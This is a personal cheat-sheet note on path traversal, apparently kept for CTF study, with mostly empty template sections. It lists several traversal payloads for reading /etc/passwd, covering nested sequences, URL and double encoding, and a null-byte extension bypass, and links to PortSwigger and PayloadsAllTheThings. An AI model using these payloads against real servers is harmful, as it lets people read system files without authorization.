# Path Traversal

## Overview

What this technique is and when I need it

## Key Concepts

Important things to understand about this technique

## Common Methods

Absolute file path: 
```bash
filename=/etc/passwd
```

When escape sequenced are stripped:
```bash
# Nested Traversal Sequence
....//....//etc//passwd
```

When input is sanitised:
```bash
# Single URL Encoding
%2e%2e%2f%2e%2e%2f%2e%2e/etc/passwd

# Double URL Encoding
..%252f..%252f..%252fetc/passwd
```

When a specific folder is expected:
```bash
/var/www/images/../../../etc/passwd
```

When a specific file extension is expected:
```bash
# NULL Characater %00
../../../etc/passwd%00.png
```

## Practical Examples

Real-world scenarios where I've used this

## Troubleshooting

- Common issues I've encountered
- Things that break this technique
- Environment-specific considerations

## Related Techniques

- [[Similar-Technique]] - How they differ
- [[Follow-up-Technique]] - What comes next

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #path-traversal
SORT file.ctime DESC
LIMIT 5
```

## Learning Resources

- [Title Unavailable \| Site Unreachable](https://portswigger.net/web-security/learning-paths/path-traversal/)
- [PayloadsAllTheThings/Directory Traversal/README.md at master · swisskyrepo/PayloadsAllTheThings · GitHub](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Directory%20Traversal/README.md)

#path-traversal #technique